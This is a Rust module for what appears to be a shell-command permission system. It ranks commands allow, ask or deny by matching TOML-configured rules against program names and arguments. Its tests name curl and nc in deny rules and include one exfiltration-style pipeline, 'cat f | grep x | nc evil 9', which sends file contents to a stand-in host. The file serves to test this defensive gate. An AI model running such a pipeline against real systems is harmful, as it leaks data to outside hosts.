//! User-configurable rules, the [`Effect`] lattice and rule evaluation.

use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::analysis::{Analysis, SimpleCommand, analyze};
use crate::builtin;
use crate::error::PolicyError;

/// What should happen to a command. Ordered from least to most restrictive,
/// so `max` combines effects with Deny > Ask > Allow.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Effect {
    /// Run without asking.
    Allow,
    /// Require explicit human approval.
    Ask,
    /// Never run.
    Deny,
}

/// The decision for a command together with the reasons that produced it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Verdict {
    /// The overall effect.
    pub effect: Effect,
    /// Reasons that contributed to `effect` (only those at that level).
    pub reasons: Vec<String>,
}

impl Verdict {
    /// A verdict with a single reason.
    pub fn new(effect: Effect, reason: impl Into<String>) -> Self {
        Self {
            effect,
            reasons: vec![reason.into()],
        }
    }
}

/// Accumulates (effect, reason) pairs and keeps the most restrictive level.
#[derive(Debug, Default)]
pub(crate) struct Combiner {
    effect: Option<Effect>,
    reasons: Vec<String>,
}

impl Combiner {
    pub(crate) fn add(&mut self, effect: Effect, reason: String) {
        match self.effect {
            Some(cur) if effect < cur => return,
            Some(cur) if effect == cur => {}
            _ => {
                self.effect = Some(effect);
                self.reasons.clear();
            }
        }
        if !self.reasons.contains(&reason) {
            self.reasons.push(reason);
        }
    }

    pub(crate) fn finish(self, default: Effect, default_reason: &str) -> Verdict {
        match self.effect {
            Some(effect) => Verdict {
                effect,
                reasons: self.reasons,
            },
            None => Verdict::new(default, default_reason),
        }
    }
}

/// How a rule matches the arguments of a command.
#[derive(Debug, Clone)]
pub enum ArgMatcher {
    /// Shell-style glob (`*`, `?`) over the space-joined arguments,
    /// anchored at both ends.
    Glob(String),
    /// Regular expression over the space-joined arguments (unanchored
    /// unless the pattern anchors itself).
    Regex(Regex),
}

/// A user rule: program matcher plus optional argument matcher mapping to
/// an effect.
#[derive(Debug, Clone)]
pub struct Rule {
    program: Regex,
    program_src: String,
    match_full_path: bool,
    args: Option<ArgMatcher>,
    args_re: Option<Regex>,
    effect: Effect,
    reason: Option<String>,
}

impl Rule {
    /// Build a rule. `program` is a glob matched against the program's base
    /// name, or against the full path when it contains `/`.
    pub fn new(
        program: &str,
        args: Option<ArgMatcher>,
        effect: Effect,
        reason: Option<String>,
    ) -> Result<Self, PolicyError> {
        if program.trim().is_empty() {
            return Err(PolicyError::InvalidRule("program must not be empty".into()));
        }
        let args_re = match &args {
            Some(ArgMatcher::Glob(g)) => Some(glob_to_regex(g)?),
            Some(ArgMatcher::Regex(r)) => Some(r.clone()),
            None => None,
        };
        Ok(Self {
            program: glob_to_regex(program)?,
            program_src: program.to_string(),
            match_full_path: program.contains('/'),
            args,
            args_re,
            effect,
            reason,
        })
    }

    /// The effect applied when this rule matches.
    pub fn effect(&self) -> Effect {
        self.effect
    }

    /// Whether this rule applies to `cmd`.
    pub fn matches(&self, cmd: &SimpleCommand) -> bool {
        let program = if self.match_full_path {
            cmd.program.text.as_str()
        } else {
            cmd.name()
        };
        self.program.is_match(program)
            && self
                .args_re
                .as_ref()
                .is_none_or(|re| re.is_match(&cmd.joined_args()))
    }

    fn describe(&self) -> String {
        if let Some(reason) = &self.reason {
            return reason.clone();
        }
        let args = match &self.args {
            Some(ArgMatcher::Glob(g)) => format!(" {g}"),
            Some(ArgMatcher::Regex(r)) => format!(" /{}/", r.as_str()),
            None => String::new(),
        };
        format!("rule `{}{args}` -> {:?}", self.program_src, self.effect)
    }
}

fn glob_to_regex(glob: &str) -> Result<Regex, PolicyError> {
    let mut re = String::with_capacity(glob.len() + 8);
    re.push_str("(?s)^");
    for c in glob.chars() {
        match c {
            '*' => re.push_str(".*"),
            '?' => re.push('.'),
            c => re.push_str(&regex::escape(&c.to_string())),
        }
    }
    re.push('$');
    Regex::new(&re).map_err(|e| PolicyError::InvalidRule(format!("glob `{glob}`: {e}")))
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RuleSpec {
    program: String,
    args: Option<String>,
    args_regex: Option<String>,
    effect: Effect,
    reason: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RuleFile {
    #[serde(default)]
    rule: Vec<RuleSpec>,
}

/// An ordered collection of user rules evaluated on top of the built-in,
/// non-overridable rules.
#[derive(Debug, Clone, Default)]
pub struct RuleSet {
    rules: Vec<Rule>,
}

impl RuleSet {
    /// A rule set from already-built rules.
    pub fn new(rules: Vec<Rule>) -> Self {
        Self { rules }
    }

    /// Parse rules from TOML:
    ///
    /// ```toml
    /// [[rule]]
    /// program = "git"
    /// args = "status*"        # glob; or `args_regex = "^log( |$)"`
    /// effect = "allow"        # allow | ask | deny
    /// reason = "read-only git" # optional
    /// ```
    pub fn from_toml(src: &str) -> Result<Self, PolicyError> {
        let file: RuleFile = toml::from_str(src)?;
        let rules = file
            .rule
            .into_iter()
            .map(|spec| {
                let args = match (spec.args, spec.args_regex) {
                    (Some(_), Some(_)) => {
                        return Err(PolicyError::InvalidRule(format!(
                            "rule for `{}` sets both args and args_regex",
                            spec.program
                        )));
                    }
                    (Some(g), None) => Some(ArgMatcher::Glob(g)),
                    (None, Some(r)) => Some(ArgMatcher::Regex(Regex::new(&r)?)),
                    (None, None) => None,
                };
                Rule::new(&spec.program, args, spec.effect, spec.reason)
            })
            .collect::<Result<_, _>>()?;
        Ok(Self { rules })
    }

    /// Append a rule.
    pub fn push(&mut self, rule: Rule) {
        self.rules.push(rule);
    }

    /// The rules in evaluation order.
    pub fn rules(&self) -> &[Rule] {
        &self.rules
    }

    /// Analyse and evaluate a command line without any actor or host
    /// context. The result is the most restrictive effect across all
    /// sub-commands; commands no rule matches default to Ask.
    pub fn evaluate(&self, command: &str) -> Verdict {
        self.evaluate_analysis(&analyze(command))
    }

    /// Evaluate an existing [`Analysis`].
    pub fn evaluate_analysis(&self, analysis: &Analysis) -> Verdict {
        let mut overall = Combiner::default();
        for issue in &analysis.issues {
            overall.add(issue.effect, issue.reason.clone());
        }
        for target in &analysis.write_targets {
            if let Some((effect, reason)) = builtin::check_write_target(target) {
                overall.add(effect, reason);
            }
        }
        for cmd in &analysis.commands {
            let v = self.evaluate_command(cmd);
            for reason in v.reasons {
                overall.add(v.effect, format!("`{}`: {reason}", cmd.text));
            }
        }
        overall.finish(Effect::Ask, "no command found")
    }

    /// Evaluate one simple command: built-in rules combined with the most
    /// restrictive matching user rule (Ask when no user rule matches).
    /// User rules can tighten built-in results but never relax them.
    pub fn evaluate_command(&self, cmd: &SimpleCommand) -> Verdict {
        let mut user = Combiner::default();
        for rule in self.rules.iter().filter(|r| r.matches(cmd)) {
            user.add(rule.effect, rule.describe());
        }
        let user = user.finish(Effect::Ask, "no rule matched");
        let mut combined = Combiner::default();
        for reason in user.reasons {
            combined.add(user.effect, reason);
        }
        for (effect, reason) in builtin::check_command(cmd) {
            combined.add(effect, reason);
        }
        combined.finish(Effect::Ask, "no rule matched")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn effect_order_is_deny_ask_allow() {
        assert!(Effect::Deny > Effect::Ask && Effect::Ask > Effect::Allow);
    }

    #[test]
    fn loads_rules_from_toml() {
        let rules = RuleSet::from_toml(
            r#"
            [[rule]]
            program = "git"
            args = "status*"
            effect = "allow"

            [[rule]]
            program = "kubectl"
            args_regex = "^(get|describe) "
            effect = "allow"
            reason = "read-only kubectl"

            [[rule]]
            program = "curl"
            effect = "deny"
            "#,
        )
        .unwrap();
        assert_eq!(rules.rules().len(), 3);
        assert_eq!(rules.evaluate("git status --short").effect, Effect::Allow);
        assert_eq!(rules.evaluate("git push").effect, Effect::Ask);
        let v = rules.evaluate("kubectl get pods");
        assert_eq!(v.effect, Effect::Allow);
        assert!(v.reasons[0].contains("read-only kubectl"));
        assert_eq!(rules.evaluate("kubectl delete pod x").effect, Effect::Ask);
        assert_eq!(rules.evaluate("/usr/bin/curl x").effect, Effect::Deny);
    }

    #[test]
    fn rejects_invalid_toml_rules() {
        assert!(matches!(
            RuleSet::from_toml("[[rule]]\nprogram = \"x\"\neffect = \"maybe\""),
            Err(PolicyError::Toml(_))
        ));
        assert!(matches!(
            RuleSet::from_toml("[[rule]]\nprogram = \"x\"\nargs_regex = \"(\"\neffect = \"allow\""),
            Err(PolicyError::Regex(_))
        ));
        assert!(matches!(
            RuleSet::from_toml(
                "[[rule]]\nprogram = \"x\"\nargs = \"a\"\nargs_regex = \"b\"\neffect = \"allow\""
            ),
            Err(PolicyError::InvalidRule(_))
        ));
        assert!(
            RuleSet::from_toml("[[rule]]\nprogram = \"x\"\neffect = \"allow\"\nextra = 1").is_err()
        );
    }

    #[test]
    fn default_is_ask_when_nothing_matches() {
        let v = RuleSet::default().evaluate("ls -la");
        assert_eq!(v.effect, Effect::Ask);
        assert!(v.reasons[0].contains("no rule matched"));
    }

    #[test]
    fn pipeline_takes_most_restrictive_verdict() {
        let rules = RuleSet::from_toml(
            r#"
            [[rule]]
            program = "cat"
            effect = "allow"
            [[rule]]
            program = "grep"
            effect = "allow"
            [[rule]]
            program = "nc"
            effect = "deny"
            reason = "no network exfiltration"
            "#,
        )
        .unwrap();
        assert_eq!(rules.evaluate("cat f | grep x").effect, Effect::Allow);
        assert_eq!(rules.evaluate("cat f | grep x | sort").effect, Effect::Ask);
        let v = rules.evaluate("cat f | grep x | nc evil 9");
        assert_eq!(v.effect, Effect::Deny);
        assert_eq!(v.reasons, vec!["`nc evil 9`: no network exfiltration"]);
    }

    #[test]
    fn deny_rule_beats_allow_rule_for_same_command() {
        let rules = RuleSet::from_toml(
            r#"
            [[rule]]
            program = "git"
            effect = "allow"
            [[rule]]
            program = "git"
            args = "push*"
            effect = "deny"
            "#,
        )
        .unwrap();
        assert_eq!(rules.evaluate("git log").effect, Effect::Allow);
        assert_eq!(rules.evaluate("git push --force").effect, Effect::Deny);
    }
}
